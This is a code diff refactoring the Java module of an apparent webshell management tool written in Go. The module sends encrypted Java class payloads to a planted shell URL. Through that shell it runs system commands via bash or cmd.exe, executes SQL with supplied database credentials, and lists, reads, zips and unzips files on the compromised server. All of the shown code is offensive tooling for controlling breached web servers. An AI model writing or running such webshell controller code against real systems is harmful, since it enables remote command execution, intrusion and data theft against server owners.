@@ -2,9 +2,7 @@ package service
 
 import (
 	"clouddrop/pkg/util"
-	"fmt"
 	"log"
-	"os"
 	"strings"
 )
 
@@ -14,131 +12,86 @@ func (s *JavaShell) GetShellType() string {
 	return "java"
 }
 
-func (s *JavaShell) FreshSession(id int, url string, password string) (string, error) {
+func (s *JavaShell) FreshSession(id int, shellURL string, password string) (string, error) {
 	if JavaSessions == nil {
 		JavaSessions = make(map[int]string)
 	}
-	password = util.GeneratePasswordSeed()
-	code, err := os.ReadFile("./pkg/api/java/Check.class")
+
+	dynamicPassword := util.GeneratePasswordSeed()
+	code, err := readPayload("java", "Check.class")
 	if err != nil {
 		return "", err
 	}
-	encode := util.Encrypt(string(code), password)
-	JavaSessions[id], err = util.PostRequestWithoutSession(url, password, encode)
+	enCode := util.EncryptWithOffset(code, dynamicPassword, util.RequestOffsetForShell(s.GetShellType()))
+
+	JavaSessions[id], err = util.PostRequestWithoutSession(shellURL, dynamicPassword, enCode)
 	if err != nil {
 		return "", err
 	}
-	session := JavaSessions[id]
-	log.Println("当前JSESSIONID " + session)
+	log.Println("当前Java会话 " + JavaSessions[id])
 
-	enResult, err := util.PostRequest(url, password, encode, session, s.GetShellType())
+	enResult, err := util.PostRequest(shellURL, dynamicPassword, enCode, JavaSessions[id], s.GetShellType())
 	if err != nil {
 		return "", err
 	}
-	res := util.Decrypt(enResult, password)
-	return res, nil
-
-}
-
-// BaseInfo
-func (s *JavaShell) BaseInfo(id int, url string, password string) (string, error) {
-	code, err := os.ReadFile("./pkg/api/java/BaseInfo.class")
-	if err != nil {
-		return "", nil
-	}
-	result, err := util.HookPost(url, password, string(code), JavaSessions[id], s.GetShellType())
+	res, err := util.DecryptWithOffset(strings.TrimSpace(enResult), dynamicPassword, 5)
 	if err != nil {
 		return "", err
 	}
-
-	return strings.TrimSpace(result), nil
+	return strings.TrimSpace(res), nil
 }
 
-func (s *JavaShell) ExecCommand(id int, command string, url string, password string) (string, error) {
-	code, err := os.ReadFile("./pkg/api/java/OS.class")
+func (s *JavaShell) hook(id int, shellURL, password, payloadName string, params map[string]string) (string, error) {
+	code, err := readPayload("java", payloadName+".class")
 	if err != nil {
-		return "", nil
+		return "", err
 	}
-	osType, err := util.HookPost(url, password, string(code), JavaSessions[id], s.GetShellType())
-	if err != nil {
-		return "", nil
-	}
-	var cmdPath string // in if-block-level scope, it must define at out
-	if osType == "Linux" {
-		cmdPath = "/bin/bash"
-	} else {
-		cmdPath = "C:/Windows/System32/cmd.exe"
-	}
-
-	code, _ = os.ReadFile("./pkg/api/java/CMD.class")
-	code = fmt.Appendf(code, "_____cmdPath-%s,exit-true,cmd-%s", cmdPath, command)
-	res, err := util.HookPost(url, password, string(code), JavaSessions[id], s.GetShellType())
-	if err != nil {
-		return "", nil
-	}
-	return res, nil
+	return util.HookPostWithOptions(shellURL, password, code, JavaSessions[id], s.GetShellType(), encodeParamsHeader(params))
 }
 
-func (s *JavaShell) ExecCode(id int, code string, url string, password string) (string, error) {
-	// todo 这里接收前端传过来的class字节码执行
-	return "", nil
+func (s *JavaShell) BaseInfo(id int, shellURL string, password string) (string, error) {
+	return s.hook(id, shellURL, password, "BaseInfo", nil)
 }
 
-func (s *JavaShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, url, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/java/DataBase.class")
-
-	if database == "" {
-		code = fmt.Appendf(code, "_____driver-%s,host-%s,port-%s,user-%s,pass-%s,encoding-%s",
-			driver, host, port, user, pass, encoding)
-	} else {
-		code = fmt.Appendf(code, "_____driver-%s,host-%s,port-%s,user-%s,pass-%s,database-%s,sql-%s,option-%s,encoding-%s",
-			driver, host, port, user, pass, database, sql, option, encoding)
-	}
-
-	res, err := util.HookPost(url, password, string(code), JavaSessions[id], s.GetShellType())
-	if err != nil {
-		return "", nil
-	}
-	return res, nil
+func (s *JavaShell) ExecCommand(id int, command string, shellURL string, password string) (string, error) {
+	osType, _ := s.hook(id, shellURL, password, "OS", nil)
+	return s.hook(id, shellURL, password, "CMD", map[string]string{
+		"cmdPath": chooseWindowsCmd(osType),
+		"exit":    "true",
+		"cmd":     command,
+	})
 }
 
-func (s *JavaShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/java/FileZip.class")
-	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
-	res, err := util.HookPost(url, password, string(code), JavaSessions[id], s.GetShellType())
-	if err != nil {
-		return "", nil
-	}
-	return res, nil
+func (s *JavaShell) ExecCode(id int, code string, shellURL string, password string) (string, error) {
+	return s.hook(id, shellURL, password, "ExecCode", map[string]string{"code": code})
 }
 
-func (s *JavaShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/java/FileUnZip.class")
-	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
-	res, err := util.HookPost(url, password, string(code), JavaSessions[id], s.GetShellType())
-	if err != nil {
-		return "", nil
-	}
-	return res, nil
+func (s *JavaShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, shellURL, password string) (string, error) {
+	return s.hook(id, shellURL, password, "DataBase", map[string]string{
+		"driver":   driver,
+		"host":     host,
+		"port":     port,
+		"user":     user,
+		"pass":     pass,
+		"database": database,
+		"sql":      sql,
+		"option":   option,
+		"encoding": encoding,
+	})
 }
 
-// FileList lists all files in the current directory
-func (s *JavaShell) FileList(id int, path string, url string, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/java/FileList.class")
-	code = fmt.Appendf(code, "_____path-%s", path)
-	res, err := util.HookPost(url, password, string(code), JavaSessions[id], s.GetShellType())
-	if err != nil {
-		return "", nil
-	}
-	return res, nil
+func (s *JavaShell) FileZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
+	return s.hook(id, shellURL, password, "FileZip", map[string]string{"srcPath": srcPath, "toPath": toPath})
 }
 
-func (s *JavaShell) FileShow(id int, path string, url string, password string) (string, error) {
-	code, _ := os.ReadFile("./pkg/api/java/FileShow.class")
-	code = fmt.Appendf(code, "_____path-%s", path)
-	res, err := util.HookPost(url, password, string(code), JavaSessions[id], s.GetShellType())
-	if err != nil {
-		return "", nil
-	}
-	return res, nil
+func (s *JavaShell) FileUnZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
+	return s.hook(id, shellURL, password, "FileUnZip", map[string]string{"srcPath": srcPath, "toPath": toPath})
+}
+
+func (s *JavaShell) FileList(id int, path string, shellURL string, password string) (string, error) {
+	return s.hook(id, shellURL, password, "FileList", map[string]string{"path": path})
+}
+
+func (s *JavaShell) FileShow(id int, path string, shellURL string, password string) (string, error) {
+	return s.hook(id, shellURL, password, "FileShow", map[string]string{"path": path})
 }
